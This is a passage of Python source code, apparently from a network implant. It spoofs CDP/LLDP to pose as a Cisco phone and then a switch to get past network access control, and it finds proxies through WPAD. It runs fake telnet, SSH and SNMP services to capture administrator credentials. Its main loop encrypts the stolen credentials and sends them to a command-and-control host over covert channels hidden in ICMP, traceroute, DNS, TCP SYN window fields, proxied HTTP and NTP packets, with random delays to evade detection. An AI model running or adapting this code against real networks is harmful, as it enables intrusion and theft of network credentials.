    xid = random.randint(0, 0xFFFF)
    dhcpdiscover = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=chaddr, xid=xid) /
                    DHCP(options=[('message-type', 'discover'), 'end'])
                   )
    sendp(dhcpdiscover, iface=iface, verbose=0)
    time.sleep(10)
    ip, netmask, gwip, dns_srv, domain, wpad = dh.join()
    # TODO
    # need to add module for static ip in case DHCP doesn't work
    if DEBUG:
        print('DHCP ended')

    # Configure interface
    if DEBUG:
        print('Interface config started')
    setip(iface, ip, netmask, gwip, dns_srv)
    if DEBUG:
        print('Interface config ended')

    # Capture ARP responses
    if DEBUG:
        print('ARP gw started')

    # Send ARP WHO-HAS to grab MAC from default gateway
    query = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=ip, pdst=gwip)
    ans, a = srp(query, iface=iface, timeout=2, verbose=0)
    for a, rcv in ans:
        gwmac = rcv[Ether].src
        break

    if DEBUG:
        print('ARP gw ended')

    if options.nic:
        # Pretend to be a phone to bypass NAC, tune the amount of time you want
        cdpdh = CDPHandler(iface, phonemac, ip, 'SEP' + phonemac.replace(':', ''), 'Port 1', False)
        cdpdh.daemon = True
        cdpdh.start()
        # Stop calling .join() after X seconds (default 60sec)
        if DEBUG:
            print('CDPd started - phone')
            time.sleep(10)
            print('CDPd stoped (60sec) - phone (verbose 10sec)')
        else:
            time.sleep(60)
        cdpdh.join()

        # Fake LLDP for phone
        lldpdh = LLDPHandler(iface, phonemac, ip, 'SEP' + phonemac.replace(':', ''), 'Port 1', False)
        lldpdh.daemon = True
        lldpdh.start()
        # Stop calling .join() after X seconds (default 60sec)
        if DEBUG:
            print('LLDP started - phone')
            time.sleep(10)
            print('LLDPd stoped (60sec) - phone (verbose 10sec)')
        else:
            time.sleep(60)
        lldpdh.join()

    if EPRX:
        prxlist = []
        if DEBUG:
            print('Proxy Discovery started')
        # Discover WPAD via DHCP Inform (Option 252) if not already via initial DHCP Reply
        if not wpad:
            dhinform = DHCPInformHandler(iface, xid)
            dhinform.daemon = True
            dhinform.start()
            dhcpinform = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                    IP(src=ip, dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=chaddr, ciaddr=ip, xid=xid) /
                    DHCP(options=[('message-type', 'inform'), ('param_req_list', 252), 'end'])
                    )
            sendp(dhcpinform, iface=iface, verbose=0)
            time.sleep(10)
            wpad = dhinform.join()
        # No option 252, look for WPAD DNS entry
        if not wpad:
            if DEBUG:
                print('Looking for wpad.<domain> entry')
            resolver = dns.resolver.Resolver(configure=False)
            resolver.nameservers = [ dns_srv ]
            resolver.timeout = 1
            resolver.lifetime = 1
            try:
                answer = resolver.query('wpad.' + domain, 'A')
            except:
                answer = None
                pass
            if answer:
                if DEBUG:
                    print('Found WPAD DNS')
                    print(answer[0])
                prxlist = getpac(str(answer[0]), 'PAD')
        else:
            if DEBUG:
                print('Found DHCP option 252: {}'.format(wpad))
            prxlist = getpac(wpad, True)

        if not prxlist:
            # Build a list for DNS lookups (~280)
            if DEBUG:
                print('Guessing DNS entry for PAC server')
            # Combine below keywords together, _ and -
            tryname = [ 'proxy', 'pac', 'wpad', 'pad', 'internet', 'inet', 'gw', 'gateway', 'prx', 'web' ]
            master_list = []
            for x in range(len(tryname)):
                master_list.append(tryname[x])
                for z in range(len(tryname)):
                    if not tryname[x] == tryname[z]:
                        master_list.append(tryname[x] + tryname[z])
                        master_list.append(tryname[x] + '-' + tryname[z])
                        master_list.append(tryname[x] + '_' + tryname[z])

            resolver = dns.resolver.Resolver(configure=False)
            resolver.nameservers = [ dns_srv ]
            resolver.timeout = 1
            resolver.lifetime = 1
            for prx in range(len(master_list)):
                try:
                    answer = resolver.query(master_list[prx] + '.' + domain, 'A')
                except:
                    answer = False
                    pass
                if answer:
                    if DEBUG:
                        print('Found DNS, looking for PAC files')
                    for rr in range(len(answer)):
                        if DEBUG:
                            print(master_list[prx] + '.' + domain + ' = ' + str(answer[rr]))
                        prxlist = getpac(str(answer[rr]), False)
                        if prxlist:
                            break
        if DEBUG:
            print('Proxy Discovery ended')

    if options.nic:
        # Wait 300sec or more to clear MAC (180sec to clear CDP)
        if DEBUG:
            time.sleep(10)
            print('Wait 300sec for MAC & CDP cache to clear (verbose 10sec)')
        else:
            time.sleep(300)
        # Change MAC to became a Cisco Switch (add default gateway again)
        if DEBUG:
            print('MAC change started - switch')
        changemac(iface, switchmac)
        FNULL = open(os.devnull, 'w')
        subprocess.call(["route", "add", "default", "gw", gwip],
                        stdout=FNULL, stderr=subprocess.STDOUT)
        if DEBUG:
            print('MAC change ended - switch')

    # Search CDP packets from discover()
    find = re.compile('[<CDPNAME>|<LLDPNAME>],(.*)')
    with open(clifd, 'r') as sfile:
        swname = find.findall(sfile.read())
    if swname:
        fakeswname = newname(swname[0])
    else:
        # make up a name if can't derive
        fakeswname = 'sw-test01'
    if DEBUG:
        print('Hostname setup - switch')

    # Start fake CDP as 'switch'
    cdpdh = CDPHandler(iface, switchmac, ip, fakeswname, switchport, True)
    cdpdh.daemon = True
    cdpdh.start()
    if DEBUG:
        print('CDPd started - switch')

    # Start fake LLDP as 'switch'
    lldpdh = LLDPHandler(iface, switchmac, ip, fakeswname, switchport, True)
    lldpdh.daemon = True
    lldpdh.start()
    if DEBUG:
        print('LLDP started - switch')

    # Create SNMP config for snmposter daemon
    ipnet = str(ipcalc.Network(ip + '/' + netmask).network())
    snmpconf(fakeswname, ip, netmask, ipnet, mac, gwip, gwmac)
    if DEBUG:
        print('SNMP config created')

    # Kill nmap-fooler process if running and start them
    kill_process('nmap-fooler')
    if DEBUG:
        print('NMAP fooler started')
    nmap = dirname + 'nmap-fooler.py ' + iface
    subprocess.call(nmap + ' &', shell=True)

    # Start snmposter daemon
    kill_process('snmposter')
    subprocess.call("/usr/local/bin/snmposter -f " + agent
                    + " 2>/dev/null", shell=True)
    snmpdh = SNMPHandler(iface, mastercred)
    snmpdh.daemon = True
    snmpdh.start()
    if DEBUG:
        print('SNMP catcher started')

    # Telnet Banner Grab
    if DEBUG:
        print('Telnet Grab started')
    listip = [gwip]
    cdpip = grepline(clifd, '<CDPIP>')
    lldpip = grepline(clifd, '<LLDPIP>')
    if cdpip:
        listip.append(cdpip.split(',')[1].strip())
    if lldpip:
        listip.append(lldpip.split(',')[1].strip())
    banner = telnetgrab(list(set(listip)))
    if banner:
        motd = re.sub('(\r\n\r\n\r\nUser Access Verification\r\n\r\n)|([uU]sername: )|([pP]assword: )|([lL]ogin: )', '', banner)
        motd = motd.replace('\r\n', '<CR>')
    else:
        motd = ''
    if DEBUG:
        print('Telnet Grab ended')

    # Create config file for telnet & ssh fake daemons
    with open(clifd, 'a') as cli:
        cli.write('<NAME>,' + fakeswname + '\n')
        cli.write('<IP>,' + ip + '\n')
        cli.write('<MASK>,' + netmask + '\n')
        cli.write('<MASKCIDR>,' + str(sum([bin(int(x)).count("1")
                                      for x in netmask.split(".")])) + '\n')
        swcmac = switchmac.replace(':', '')
        swmaccisco = swcmac[0:4].lower() + '.' + swcmac[4:8].lower()\
            + '.' + swcmac[8:12].lower()
        cli.write('<MAC>,' + swmaccisco + '\n')
        cli.write('<INT>,' + switchport + '\n')
        cli.write('<NETIP>,' + ipnet + '\n')
        cli.write('<GWIP>,' + gwip + '\n')
        macraw = gwmac.replace(':', '')
        gwmaccisco = macraw[0:4] + '.' + macraw[4:8] + '.' + macraw[8:12]
        cli.write('<GWMAC>,' + gwmaccisco + '\n')
        cli.write('<SERIAL>,' + serial + '\n')
        cli.write('<SNPSU>,' + snpsu + '\n')
        # Future use in Circo v2
        cli.write('<SNMPC>,' + snmpcommunity + '\n')
        cli.write('<MOTD>,' + motd + '\n')
    if DEBUG:
        print('CLI config created')

    # Kill telnet/ssh process if running and start them
    kill_process('telnetd-fake')
    if DEBUG:
        print('TELNET catcher started')
    telned = dirname + 'telnetd-fake.py'
    subprocess.call(telned + ' ' + mastercred + ' &', shell=True)
    if DEBUG:
        print('SSH catcher started')
    kill_process('sshd-fake')
    sshd = dirname + 'sshd-fake.py'
    subprocess.call(sshd + ' ' + mastercred + ' &', shell=True)

    # If Fake-AP exfiltration enable put wireless interface into monitor
    # Channel 10 (adjust as necessary to match jaula_v1.py)
    if EAP:
        if DEBUG:
            print('WIFI monitor started')
        subprocess.call('sudo ip link set ' + wiface + ' down', shell=True)
        time.sleep(0.3)
        subprocess.call('sudo iw ' + wiface + ' set monitor control', shell=True)
        time.sleep(0.3)
        subprocess.call('sudo ip link set ' + wiface + ' up', shell=True)
        time.sleep(0.3)
        subprocess.call('sudo iw ' + wiface + ' set channel ' + WIFICHANNEL, shell=True)

        # Start Fake AP
        aphd = APHandler(wiface, mastercred, 2)
        aphd.daemon = True
        aphd.start()
        if DEBUG:
            print('AP started')

    # Start case alarm
    if EPRX:
        if prxlist:
            prxlt = prxlist
        else:
            prxlt = False
    else:
        prxlt = False
    if EAP:
        alarmdh = AlarmHandler(switchmac, gwmac, ip, iface, wiface, dns_srv, prxlt)
    else:
        alarmdh = AlarmHandler(switchmac, gwmac, ip, iface, None, dns_srv, prxlt)
    alarmdh.daemon = True
    alarmdh.start()
    if DEBUG:
        print('Case alarm started')

    # Main Loop if credentials found
    while True:
        try:
            if os.path.isfile(mastercred):
                with open(mastercred, 'r') as sfile:
                    for line in sfile:
                        # encrypt and split into 4 bytes
                        cry = encrypt(line.strip())
                        ar = [cry[i:i+4] for i in range(0, len(cry), 4)]
                        ar8 = [cry[i:i+8] for i in range(0, len(cry), 8)]
                        if len(cry) % 4 != 0:
                            for x in range(4-len(ar[len(ar)-1])):
                                ar[len(ar)-1] = ar[len(ar)-1] + '0'
                        if len(cry) % 8 != 0:
                            for x in range(8-len(ar8[len(ar8)-1])):
                                ar8[len(ar8)-1] = ar8[len(ar8)-1] + '0'

                        # ICMP exfiltration
                        # Use [IP].id 200+len of crypto (first pkt)
                        # Then [IP].id 300+amount of pkts (split by 16bits)
                        # Send the crypto split by 16bits and replace
                        # [ICMP].seq field
                        if EPING:
                            if DEBUG:
                                print('Sending credentials via ICMP')
                            # craft packet
                            pingpkt = (Ether(src=switchmac, dst=gwmac) /
                                       IP(ihl=5, src=ip, dst=cchost)/ICMP() /
                                       Raw(load='\x00\x00\x00\x00\x18\x83'
                                                '\xedt\xab\xcd\xab\xcd\xab'
                                                '\xcd\xab\xcd\xab\xcd\xab'
                                                '\xcd\xab\xcd\xab\xcd\xab'
                                                '\xcd\xab\xcd\xab\xcd\xab'
                                                '\xcd\xab\xcd\xab\xcd\xab'
                                                '\xcd\xab\xcd\xab\xcd\xab'
                                                '\xcd\xab\xcd\xab\xcd\xab'
                                                '\xcd\xab\xcd\xab\xcd\xab'
                                                '\xcd\xab\xcd\xab\xcd\xab'
                                                '\xcd\xab\xcd\xab\xcd\xab'
                                                '\xcd\xab\xcd\xab\xcd'))

                            # first pkt (crypto len)
                            pingpkt[IP].id = 200 + len(cry)
                            pingpkt[ICMP].seq = 1
                            pingpkt[ICMP].id = random.randint(0, 0xFFFF)
                            pingpkt = pingpkt.__class__(str(pingpkt))
                            sendp(pingpkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # second pkt (amount of pkts)
                            del pingpkt[IP].chksum
                            del pingpkt[ICMP].chksum
                            pingpkt[IP].id = 300 + len(ar)
                            pingpkt[ICMP].seq = 2
                            pingpkt[ICMP].id = pingpkt[ICMP].id + 1
                            pingpkt = pingpkt.__class__(str(pingpkt))
                            sendp(pingpkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # paylod pkts
                            for x in range(len(ar)):
                                del pingpkt[IP].chksum
                                del pingpkt[ICMP].chksum
                                pingpkt[IP].id = 500 + x
                                pingpkt[ICMP].seq = int(ar[x], 16)
                                pingpkt[ICMP].id = pingpkt[ICMP].id + 1
                                pingpkt = pingpkt.__class__(str(pingpkt))
                                sendp(pingpkt, iface=iface, verbose=0)
                                # random delay
                                if not DEBUG:
                                    time.sleep(random.randint(1, 30))
                                else:
                                    time.sleep(1)

                        # Traceroute exfiltration
                        # Use [IP].id 200+len and [IP].id 300+amount of pkts
                        # To encapsulate crypto, split by 16bits and attach
                        # last 4 bytes of traceroute[UDP] Raw (@ABC.....)
                        if ETRACE:
                            if DEBUG:
                                print('Sending credentials via Traceroute')
                            # craft packet
                            trcpkt = (Ether(src=switchmac, dst=gwmac) /
                                      IP(ihl=5, src=ip, dst=cchost) /
                                      UDP(sport=53200, dport=33434) /
                                      Raw(load='@ABCDEFGHIJKLMNOP'
                                               'QRSTUVWXYZ[abcd'))

                            # first pkt (crypto len)
                            trcpkt[IP].ttl = 32
                            trcpkt[IP].id = 200 + len(cry)
                            trcpkt = trcpkt.__class__(str(trcpkt))
                            sendp(trcpkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # second pkt (amount of pkts)
                            trcpkt[IP].id = 300 + len(ar)
                            del trcpkt[IP].chksum
                            del trcpkt[UDP].chksum
                            trcpkt = trcpkt.__class__(str(trcpkt))
                            sendp(trcpkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # payload pkts
                            for x in range(len(ar)):
                                del trcpkt[IP].chksum
                                del trcpkt[UDP].chksum
                                trcpkt[IP].id = 500 + x
                                trcpkt[IP].ttl = 32 - x
                                trcpkt[UDP].dport = trcpkt[UDP].dport + x // 3
                                trcpkt[Raw].load = '@ABCDEFGHIJKLMNO'\
                                                   'PQRSTUVWXYZ[' + ar[x]
                                trcpkt = trcpkt.__class__(str(trcpkt))
                                sendp(trcpkt, iface=iface, verbose=0)
                                # random delay
                                if not DEBUG:
                                    time.sleep(random.randint(1, 30))
                                else:
                                    time.sleep(1)

                        # DNS exfiltration
                        # Within a DNS NS pkt, we set the crypto (all of it)
                        # as subdomain <crypto>.ccname
                        if EDNS:
                            if DEBUG:
                                print('Sending credentials via DNS')
                            # craft packet
                            dnspkt = (Ether(src=switchmac, dst=gwmac) /
                                      IP(ihl=5, src=ip, dst=dns_srv) /
                                      UDP(sport=53, dport=53) /
                                      DNS(rd=1,
                                          qd=DNSQR(
                                                   qname=cry+'.'+ccname,
                                                   qtype='NS')))

                            # one pkt (crypto)
                            dnspkt[IP].id = random.randint(0, 0xFFFF)
                            dnspkt[DNS].id = random.randint(0, 0xFFFF)
                            dnspkt = dnspkt.__class__(str(dnspkt))
                            sendp(dnspkt, iface=iface, verbose=0)

                        # HTTP exfiltration
                        # We don't neeed a fully TCP/3WAY, just a few SYN
                        # packets. As before, [IP].id used for crypto len &
                        # amount of pkt. The crypto payload split / 4
                        # (16bits each) hidden on [TCP].window field
                        if EWEB:
                            if DEBUG:
                                print('Sending credentials via HTTP')
                            # craft packet
                            httppkt = (Ether(src=switchmac, dst=gwmac) /
                                       IP(ihl=5,
                                          flags='DF',
                                          src=ip,
                                          dst=cchost) /
                                       TCP(sport=random.randint(3025, 38000),
                                           dport=80,
                                           ack=0,
                                           dataofs=10,
                                           reserved=0,
                                           flags='S',
                                           urgptr=0))
                            httppkt[TCP].options = [('MSS', 1460),
                                                    ('SAckOK', ''),
                                                    ('Timestamp',
                                                     (int(time.time()), 0)),
                                                    ('NOP', None),
                                                    ('WScale', 6)]
                            httppkt[TCP].seq = random.randint(1000000000,
                                                              1800000000)
                            httppkt[TCP].window = random.randint(30000, 40000)

                            # first pkt (crypto len)
                            httppkt[IP].id = 200 + len(cry)
                            httppkt = httppkt.__class__(str(httppkt))
                            sendp(httppkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # second pkt (amount of pkts)
                            del httppkt[IP].chksum
                            del httppkt[TCP].chksum
                            httppkt[IP].id = 300 + len(ar)
                            httppkt = httppkt.__class__(str(httppkt))
                            sendp(httppkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # payload pkts
                            for x in range(len(ar)):
                                del httppkt[IP].chksum
                                del httppkt[TCP].chksum
                                httppkt[IP].id = 500 + x
                                httppkt[TCP].window = int(ar[x], 16)
                                httppkt = httppkt.__class__(str(httppkt))
                                sendp(httppkt, iface=iface, verbose=0)
                                # random delay
                                if not DEBUG:
                                    time.sleep(random.randint(1, 30))
                                else:
                                    time.sleep(1)

                        # HTTPS/SSL exfiltration
                        # We don't neeed a fully TCP/3WAY, just a few SYN
                        # packets. As before, [IP].id used for crypto len &
                        # amount of pkt. The crypto payload split / 4
                        # (16bits each) hidden on [TCP].window field
                        if ESSL:
                            if DEBUG:
                                print('Sending credentials via HTTPS')
                            # craft packet
                            httpspkt = (Ether(src=switchmac, dst=gwmac) /
                                        IP(ihl=5,
                                           flags='DF',
                                           src=ip,
                                           dst=cchost) /
                                        TCP(sport=random.randint(3025, 38000),
                                            dport=443,
                                            ack=0,
                                            dataofs=10,
                                            reserved=0,
                                            flags='S',
                                            urgptr=0))
                            httpspkt[TCP].options = [('MSS', 1460),
                                                     ('SAckOK', ''),
                                                     ('Timestamp',
                                                      (int(time.time()), 0)),
                                                     ('NOP', None),
                                                     ('WScale', 6)]
                            httpspkt[TCP].seq = random.randint(1000000000,
                                                               1800000000)
                            httpspkt[TCP].window = random.randint(30000, 40000)

                            # first pkt (crypto len)
                            httpspkt[IP].id = 200 + len(cry)
                            httpspkt = httpspkt.__class__(str(httpspkt))
                            sendp(httpspkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # second pkt (amount of pkts)
                            del httpspkt[IP].chksum
                            del httpspkt[TCP].chksum
                            httpspkt[IP].id = 300 + len(ar)
                            httpspkt = httpspkt.__class__(str(httpspkt))
                            sendp(httpspkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # payload pkts
                            for x in range(len(ar)):
                                del httpspkt[IP].chksum
                                del httpspkt[TCP].chksum
                                httpspkt[IP].id = 500 + x
                                httpspkt[TCP].window = int(ar[x], 16)
                                httpspkt = httpspkt.__class__(str(httpspkt))
                                sendp(httpspkt, iface=iface, verbose=0)
                                # random delay
                                if not DEBUG:
                                    time.sleep(random.randint(1, 30))
                                else:
                                    time.sleep(1)

                        if EPRX:
                            if prxlist:
                                if DEBUG:
                                    print('Sending credentials via Proxy: ' + ' '.join(prxlist))
                            # setup proxy and send HTTPS (DNS crypto)
                                headers = {
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv11.0) like Gecko',
                                        'Accept-Enconding': ', '.join(('gzip', 'deflate')),
                                        'Accept': '*/*',
                                        'Connection': 'keep-alive'
                                }
                                fakeurl = 'http://' + cry + '.' + ccname
                                for prx in range(len(prxlist)):
                                    http_proxy = 'http://' + prxlist[prx]
                                    proxyDict = {
                                                'http': http_proxy,
                                                'https': http_proxy
                                                }
                                    try:
                                        r = requests.get(fakeurl, headers=headers, proxies=proxyDict)
                                    except requests.exceptions.RequestException:
                                        pass 
                                    if not DEBUG:
                                        time.sleep(random.randint(1, 30))
                                    else:
                                        time.sleep(1)
                        if ENTP:
                            if DEBUG:
                                print('Sending credentials via NTP')
                            # first pkt
                            # Stratum = 16
                            # Poll = len total_seq
                            # Precision = len crypto
                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
                            s.bind((ip, 123))
                            s.connect((cchost, 123))
                            timenow = datetime.utcnow() - datetime(1900, 1, 1, 0, 0, 0)
                            ntptime = format(int(timenow.total_seconds()), 'x').decode('hex')
                            ntppkt = '\xe3\x10' + chr(len(ar8)) + chr(len(cry)) + '\0\x01\0\0\0\x01' + 30 * '\0' + ntptime + 4 * '\0'
                            s.send(ntppkt)

                            # random delay
                            if DEBUG:
                                time.sleep(1)
                            else:
                                time.sleep(random.randint(1, 30))

                            # paylod pkts
                            # Stratum = 0
                            # Poll = seq #
                            # Transmit Timestamp  = <timestamp>.<crypto> 4 bytes
                            for x in range(len(ar8)):
                                timenow = datetime.utcnow() - datetime(1900, 1, 1, 0, 0, 0)
                                ntptime = format(int(timenow.total_seconds()), 'x').decode('hex')
                                ntppkt = '\xe3\0' + chr(x+1) + '\xfa' + '\0\x01\0\0\0\x01' + 30 * '\0' + ntptime + ar8[x].decode('hex')
                                s.send(ntppkt)
                                # random delay
                                if DEBUG:
                                    time.sleep(1)
                                else:
                                    time.sleep(random.randint(1, 30))
                            s.close()

                # Define interval between exfiltration (per line of cred file)
                if DEBUG:
                    print('Credentials by line 300sec interval (20s verbose)')
                    time.sleep(20)
                else:
                    time.sleep(300)

        # Capture ctrl+c for clean exit
        except KeyboardInterrupt:
            kill_process('sshd-fake')
            kill_process('telnetd-fake')
            kill_process('snmposter')
            kill_process('nmap')
            cdpdh.join()
            lldpdh.join()
            alarmdh.join()
            try:
                aphd.join()
            except NameError:
                pass
            sys.exit(0)


# Call main
if __name__ == '__main__':
    main()
